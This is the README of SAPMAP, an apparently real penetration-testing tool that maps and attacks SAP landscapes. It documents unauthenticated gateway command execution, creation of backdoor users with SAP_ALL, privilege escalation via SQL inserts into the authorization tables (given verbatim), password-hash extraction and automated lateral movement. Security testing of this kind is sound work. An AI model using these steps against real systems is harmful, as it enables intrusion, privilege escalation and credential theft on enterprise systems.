# SAPMAP — SAP Landscape Attack Path Mapper

```
   _____ ___    ____  __  ______    ____
  / ___//   |  / __ \/  |/  /   |  / __ \
  \__ \/ /| | / /_/ / /|_/ / /| | / /_/ /
 ___/ / ___ |/ ____/ /  / / ___ |/ ____/
/____/_/  |_/_/   /_/  /_/_/  |_/_/
```

**Like BloodHound for Active Directory, but for SAP.**

SAPMAP discovers SAP systems on a network, maps RFC connections between them, exploits gateway vulnerabilities and weak configurations, and charts lateral movement paths across the entire SAP landscape — all from an interactive web-based map.

> **For authorized security testing only.**

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Usage](#usage)
- [Web GUI](#web-gui)
- [Scanning](#scanning)
- [Exploitation](#exploitation)
- [Local Privilege Escalation](#local-privilege-escalation)
- [Propagation](#propagation)
- [Standalone Tools](#standalone-tools)
- [State Management](#state-management)
- [Configuration](#configuration)

---

## Features

### Discovery & Enumeration
- **Network scanning** — Fast mode (dispatcher/gateway ports) and deep mode (full SAPology fingerprinting)
- **Target parsing** — Single IPs, CIDR subnets, IP ranges, comma-separated lists, files (`@targets.txt`)
- **Client enumeration** — Bruteforce SAP clients 000–999 via DIAG protocol
- **System identification** — Unauthenticated RFC_SYSTEM_INFO probing (3 methods: V6 single-packet, V2 error leak, Chipik-style)
- **SAPControl queries** — Extract SID, database type, system type, and OS via SOAP API (GetInstanceProperties, GetProcessList)
- **Database detection** — Port fingerprinting for HANA, MaxDB, MSSQL, Oracle, DB2

### Exploitation
- **Gateway SAPXPG exploit** — Unauthenticated OS command execution via the 10KBLAZE technique (P1→P2→P3→P4 protocol chain)
- **Direct database injection** — Create SAP users by injecting into USR02/UST04/USRBF2 tables via SQL CLI tools (hdbsql, sqlcli, sqlcmd, sqlplus, db2)
- **BAPI user creation** — Authenticated user creation with SAP_ALL via BAPI_USER_CREATE1
- **SXPG remote execution** — Create users on remote systems via TCP/IP RFC destinations and SXPG_STEP_XPG_START
- **Post-creation verification** — Confirm user exists and has SAP_ALL via RFC logon + BAPI_USER_GET_DETAIL

### Local Privilege Escalation
- **Extensible LPE framework** — Plugin-style `@lpe_method` decorator: add new methods by writing one function
- **BAPI profile assignment** — Direct RFC call to assign SAP_ALL via BAPI_USER_PROFILES_ASSIGN (requires S_RFC)
- **WebGUI RSBDCOS0 exploit** — Reverse-engineered WebGUI HTTP protocol to execute OS commands via RSBDCOS0, running SQL INSERTs to assign SAP_ALL directly in the database — bypasses S_RFC authorization entirely

### Lateral Movement
- **RFC connection mapping** — Retrieve all Type 3 and TCP/IP RFC destinations from compromised systems
- **Destination testing** — Validate logon, ping, and latency via /SDF/RFC_CHECK with automatic fallback to DEST_CHECK_CONNECTION on older systems
- **Automated propagation** — Iteratively exploit RFC connections to move across the landscape
- **Attack path visualization** — Color-coded connections showing SAP_ALL access, gateway exploit paths, and risk levels

### Interactive Map
- **SVG-based visualization** — Drag-and-drop system nodes with persistent positions
- **Real-time console** — Live streaming output of all operations
- **Context menus** — Right-click systems or the map background for quick actions
- **Connection details** — Hover over RFC links to see destination info, profiles, roles, risk assessment
- **State persistence** — Save/load `.sapmap` session files, auto-save on exit

### Data Extraction
- **Password hash download** — Extract BCODE/PASSCODE from USR02
- **Arbitrary table reads** — Download any SAP table via RFC_READ_TABLE
- **Client role detection** — Identify production (P), QA (Q), test (T) systems from T000

### Cleanup
- **User deletion** — Remove all created SAPMAP users via BAPI_USER_DELETE
- **Destination removal** — Clean up created TCP/IP RFC destinations

---

## Architecture

```
sapmap.py                    Entry point — CLI args, server launch, state management
│
├── sapmap_gui.py            Bottle HTTP server — 50+ REST API routes
│   └── sapmap_html.py       Single-page web application (HTML/CSS/JS)
│
├── sapmap_scanner.py        Network discovery — fast/deep scan, SAPControl, RFC probing
├── sapmap_exploit.py        Exploitation engine — GW exploit, BAPI, SXPG, propagation
├── sapmap_lpe.py            Local privilege escalation — extensible method registry (WebGUI, BAPI)
├── sapmap_rfc.py            Authenticated RFC operations — BAPI calls, table reads, destination testing
│
├── sapmap_models.py         Data models — SAPNode, RFCConnection, CreatedUser, SAPMAPState
├── sapmap_config.py         Configuration — SQL templates, password hashes, defaults, colors
├── sapmap_state.py          State persistence — save/load JSON, RFC cache, destinations
└── sapmap_cleanup.py        Cleanup — delete users, remove destinations
```

### Standalone Tools

```
sap_gw_xpg_standalone.py    Gateway SAPXPG exploit — raw SAP NI protocol (stdlib only)
sap_rfc_system_info.py       Unauthenticated RFC_SYSTEM_INFO retrieval (stdlib only)
sap_client_enum.py           DIAG protocol client enumeration (stdlib only)
sap_rfc_ctypes.py            RFC connection library — ctypes wrapper for SAP NW RFC SDK
```

### Key Data Models

| Model | Purpose |
|-------|---------|
| `SAPNode` | An SAP system: SID, type, instances, ports, credentials, findings, position on map |
| `RFCConnection` | An RFC link between two systems: destination name, user, profiles, SAP_ALL status, risk level |
| `CreatedUser` | A user created by SAPMAP: username, method (gw_exploit/bapi/sxpg), password, timestamp |
| `SAPMAPState` | The full session: all nodes, connections, created users, scan config |

---

## Installation

### Requirements

- Python 3.8+
- `bottle` — HTTP server framework
- `pywebview` — Native window (optional, falls back to browser)

### Setup

```bash
git clone https://github.com/kloris/SAPMAP.git
cd SAPMAP
pip install bottle pywebview
```

### SAP NW RFC SDK (optional, for authenticated operations)

Authenticated RFC calls (BAPI user creation, RFC connection retrieval, table reads) require the SAP NetWeaver RFC SDK:

1. Download from SAP Software Center (requires S-user)
2. Extract to e.g. `/opt/nwrfcsdk/`
3. Set the library path:
   ```bash
   export LD_LIBRARY_PATH=/opt/nwrfcsdk/lib:$LD_LIBRARY_PATH
   ```
4. Pass `--sdk /opt/nwrfcsdk/lib` when launching SAPMAP

> Unauthenticated features (scanning, gateway exploit, system info) work without the SDK.

---

## Usage

### Launch the GUI

```bash
python3 sapmap.py                                    # Auto-detect: pywebview or browser
python3 sapmap.py --browser                          # Force browser mode
python3 sapmap.py --port 8080                        # Custom port
python3 sapmap.py --load states/my_landscape.sapmap  # Resume a saved session
python3 sapmap.py --sdk /opt/nwrfcsdk/lib            # Set NW RFC SDK path
```

### CLI Options

| Option | Description |
|--------|-------------|
| `--load FILE` | Load a saved `.sapmap` state file |
| `--sdk PATH` | Path to SAP NW RFC SDK lib directory |
| `--port PORT` | HTTP server port (0 = auto-select) |
| `--browser` | Force browser mode (skip pywebview) |
| `--no-gui` | Server only — open browser manually |
| `--targets TARGETS` | Scan targets (CLI mode, implies --no-gui) |
| `--fast` | Fast scan mode (default) |
| `--deep` | Deep scan mode (full SAPology) |
| `-v, --verbose` | Verbose output |
| `--debug` | Enable debug logging |

---

## Web GUI

The web interface is a single-page application with an interactive SVG map.

### Map Interaction

| Action | Effect |
|--------|--------|
| **Drag node** | Reposition a system on the map |
| **Left-click node** | Show system info panel |
| **Right-click node** | Open system context menu |
| **Right-click background** | Open global actions menu |
| **Hover connection** | Show RFC connection details |
| **Mouse wheel** | Zoom in/out |
| **Ctrl+S** | Save state |

### System Context Menu

| Action | Description |
|--------|-------------|
| RFC System Info | Unauthenticated system probing (SID, OS, DB, kernel) |
| Deep Scan | Full SAPology vulnerability assessment |
| Set/Test Credentials | Manage authentication for the system |
| Retrieve RFC Connections | Map all RFC destinations (via RSRFCCHK) |
| Test RFC Destinations | Validate all discovered connections |
| Check Gateway | Test SAPXPG vulnerability |
| Create User (GW Exploit) | Unauthenticated user creation via gateway |
| Create User (BAPI) | Authenticated user creation |
| Try Local Privilege Escalation | Assign SAP_ALL to current user (tries BAPI, then WebGUI SQL) |
| Propagate | Exploit RFC links to reach other systems |
| Download Hashes | Extract USR02 password hashes |
| Download Table | Read arbitrary SAP table data |
| Set OS/DB/System Type | Manual override for detection gaps |
| Cleanup Users | Delete all SAPMAP-created users |
| Delete System | Remove from the map |

### Map Background Menu

| Action | Description |
|--------|-------------|
| Add System Manually | Add a system by IP/hostname |
| Auto-Propagate All | Propagate from all compromised systems |
| Cleanup All Users | Delete all created users across all systems |
| Fit to Window | Auto-zoom to fit all systems |
| Reset Layout | Rearrange all systems |

### Visual Indicators

| Element | Meaning |
|---------|---------|
| Green border | Normal system |
| Dark red border | Critical findings or vulnerable gateway |
| Red-tinted fill | Production system |
| Orange-tinted fill | Non-production system |
| Red connection line | RFC destination with SAP_ALL |
| Blue connection line | Regular RFC connection |
| Orange connection line | Gateway exploit path |
| Lightning bolt icon | System is compromised (pwned) |

---

## Scanning

### Fast Scan (default)

Scans dispatcher ports (32XX) and gateway ports (33XX) across the instance range 00–99:

```
Target: 10.0.0.0/24
Ports checked per host: 3200-3299 (dispatcher), 3300-3399 (gateway)
```

For each discovered system, SAPMAP automatically:
1. Probes RFC_SYSTEM_INFO (unauthenticated) to get SID, hostname, OS, DB type, kernel
2. Falls back to SAPControl SOAP API for SID, DB type, system type (ABAP/JAVA)
3. Falls back to SAPControl GetProcessList for OS type detection (.EXE = Windows)
4. Scans database ports (HANA 3XX13, MaxDB 7210, MSSQL 1433, Oracle 1521, DB2 50000)
5. Enumerates clients via DIAG protocol

### Deep Scan

Uses SAPology for comprehensive port scanning, service fingerprinting, and vulnerability assessment including SSL/TLS checks, MS ACL testing, and CVE detection.

---

## Exploitation

### Gateway SAPXPG Exploit (Unauthenticated)

The 10KBLAZE technique exploits unprotected SAP Gateway access to execute OS commands via the SAPXPG external program interface:

```
P1: GW_NORMAL_CLIENT    → Register with SAP Gateway
P2: F_SAP_INIT          → Start SAPXPG conversation
P3: SAPXPG_START_XPG    → Execute OS command
P4: SAPXPG_END_XPG      → Retrieve command output
```

SAPMAP uses this to run SQL commands that create a user directly in the database:

| Database | Method |
|----------|--------|
| HANA | Write SQL to temp file via python3, execute with `hdbsql -I` |
| MaxDB | Write SQL to temp file via python, execute with `sqlcli -i` |
| MSSQL | Execute `sqlcmd -Q` with inline SQL |
| Oracle | Pipe SQL to `sqlplus` via `/bin/sh -c` |
| DB2 | Execute `db2` CLI with inline SQL |

The created user (SAPMAP00) gets:
- Pre-computed password hashes (BCODE + PASSCODE, CODVN=G)
- SAP_ALL and SAP_NEW profiles
- Service user type (USTYP=S)
- Reference user DDIC
- Full authorization object entries (S_RFC, S_TCODE, S_USER_GRP, etc.)

### BAPI User Creation (Authenticated)

When credentials are available, SAPMAP creates users via standard BAPI function modules:

1. `BAPI_USER_CREATE1` — Create the user with USTYP=S
2. `BAPI_USER_PROFILES_ASSIGN` — Assign SAP_ALL + SAP_NEW profiles
3. `BAPI_USER_GET_DETAIL` — Verify the user was created successfully

### RFC Destination Testing

SAPMAP tests RFC destinations using `/SDF/RFC_CHECK` with automatic fallback to `DEST_CHECK_CONNECTION` on older systems (NW < 7.40) where `/SDF/RFC_CHECK` doesn't exist. The fallback also provides remote system SID, client, and basis release.

---

## Local Privilege Escalation

When you have SAP credentials that lack SAP_ALL, SAPMAP can attempt to escalate the user's privileges directly on the system. Right-click a system on the map and choose **"Try Local Privilege Escalation"**.

### How It Works

SAPMAP tries registered LPE methods in priority order until one succeeds:

| Priority | Method | Mechanism | Requirements |
|----------|--------|-----------|--------------|
| 10 | `bapi_profiles_assign` | Direct RFC call to `BAPI_USER_PROFILES_ASSIGN` | S_RFC authorization for the BAPI function group |
| 50 | `webgui_rsbdcos0` | Execute SQL via OS commands through WebGUI | WebGUI HTTP access + S_TCODE for SE38 + authorization for RSBDCOS0 |

### WebGUI RSBDCOS0 Method (Detail)

This method reverse-engineers the SAP WebGUI HTTP protocol to execute OS commands without S_RFC authorization. The WebGUI runs transactions in dialog mode on the application server, so only S_TCODE and object-level authorizations apply — **not S_RFC**.

**Protocol flow:**

1. Open `SE38` with program `RSBDCOS0` via URL parameter: `~transaction=*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt`
2. Load the selection screen via initial POST roundtrip with XSRF token (`~SEC_SESSTOKEN`)
3. Execute OS commands via `state/ur` URL pattern with field values in the path

**SQL statements executed** (example for HANA, user `basis_user`, client `000`):

```sql
-- Assign SAP_ALL and SAP_NEW profiles
INSERT INTO UST04 (MANDT,BNAME,PROFILE) VALUES ('000','basis_user','SAP_ALL')
INSERT INTO UST04 (MANDT,BNAME,PROFILE) VALUES ('000','basis_user','SAP_NEW')
INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) VALUES ('000','basis_user','14','C SAP_ALL')

-- Authorization object entries (S_RFC, S_TCODE, S_USER_GRP, etc.)
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_ADMI_FCD','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_DATASET','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_DEVELOP','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_RFC','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_TABU_DIS','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_TCODE','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_AUT','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_GRP','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_PRO','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_XMI_PROD','^&_SAP_ALL')
```

Each SQL statement is wrapped in the appropriate DB CLI command (hdbsql for HANA, sqlcli for MaxDB, sqlcmd for MSSQL, sqlplus for Oracle, db2 for DB2) and executed as an OS command via RSBDCOS0.

### Adding New LPE Methods

New methods can be added by defining a decorated function in `sapmap_lpe.py` — no GUI, API, or framework changes needed:

```python
@lpe_method("my_new_method", "Description shown in console output", priority=75)
def lpe_my_new_method(node: SAPNode, creds: Credentials) -> bool:
    # Your escalation logic here
    # Return True if SAP_ALL was successfully assigned
    return True
```

---

## Propagation

Propagation is the core lateral movement capability. From a compromised system, SAPMAP:

1. **Retrieves RFC connections** — Runs RSRFCCHK to discover all Type 3 and TCP/IP destinations
2. **Tests each destination** — Validates logon success, SAP_ALL on the RFC user, and TCP/IP ping
3. **Creates users on targets** — Uses the best available method:
   - BAPI via RFC destination (if logon works and RFC user has SAP_ALL)
   - SXPG via TCP/IP destination (if remote command execution works)
   - Gateway exploit (if target gateway is vulnerable)
4. **Recurses** — Repeats from each newly compromised system

The map updates in real-time as new systems are reached, showing attack paths as colored connection lines.

---

## Standalone Tools

Each standalone tool works independently with no external dependencies (Python 3 stdlib only).

### sap_gw_xpg_standalone.py

Gateway SAPXPG command execution:

```bash
python3 sap_gw_xpg_standalone.py \
    --host 192.168.1.100 --port 3300 \
    --sid S4H --hostname s4hanadev \
    --command whoami --params "" \
    --kernel 793 -v
```

### sap_rfc_system_info.py

Unauthenticated system info retrieval:

```bash
python3 sap_rfc_system_info.py -t 192.168.1.100 -p 3300 -v
```

Extracts SID, hostname, OS, kernel version, database type, and IP addresses using three probe methods (V6 single-packet, V2 error leak, Chipik-style).

### sap_client_enum.py

DIAG-based client enumeration:

```bash
python3 sap_client_enum.py -t 192.168.1.100 -p 3200
```

Discovers valid client numbers (000–999) by testing DIAG logon responses.

---

## State Management

### Saving & Loading

SAPMAP sessions are saved as `.sapmap` JSON files containing all nodes, connections, created users, and map positions. State is auto-saved on exit.

```bash
# Save via GUI: Ctrl+S or File menu
# Load via CLI:
python3 sapmap.py --load states/landscape_2026-03-11.sapmap
```

### Persistent Caches

Separate from session state, these persist across sessions:
- **RFC check cache** (`.sapmap_rfc_cache.json`) — Cached destination test results
- **Created destinations** (`.sapmap_created_destinations.json`) — Log of TCP/IP destinations created

---

## Configuration

Key constants in `sapmap_config.py`:

### User Creation

| Setting | Value | Description |
|---------|-------|-------------|
| `SAPMAP_USER_PREFIX` | `SAPMAP` | Username prefix (SAPMAP00–SAPMAP99) |
| `SAPMAP_PASSWORD` | `Andinyougo123!` | Password for all created users |
| `USER_TYPE` | `S` | Service user (no dialog logon restrictions) |
| `CODVN` | `G` | Password hash version (SHA-1 salted, kernel 7.x) |

### Scanning

| Setting | Default | Description |
|---------|---------|-------------|
| `DEFAULT_INSTANCE_RANGE` | `(0, 99)` | SAP instance numbers to scan |
| `DEFAULT_THREADS` | `20` | Concurrent scan threads |
| `DEFAULT_TIMEOUT` | `3` | Socket timeout in seconds |

### Supported Database Types

| Code | Database |
|------|----------|
| HDB | SAP HANA |
| ADA | MaxDB / SAP DB / ADABAS D |
| MSS | Microsoft SQL Server |
| ORA | Oracle |
| DB6 | IBM DB2 |

### Supported OS Types

Linux, Windows, AIX, HP-UX, SunOS

---

## License

For authorized security testing only. Unauthorized access to computer systems is illegal.
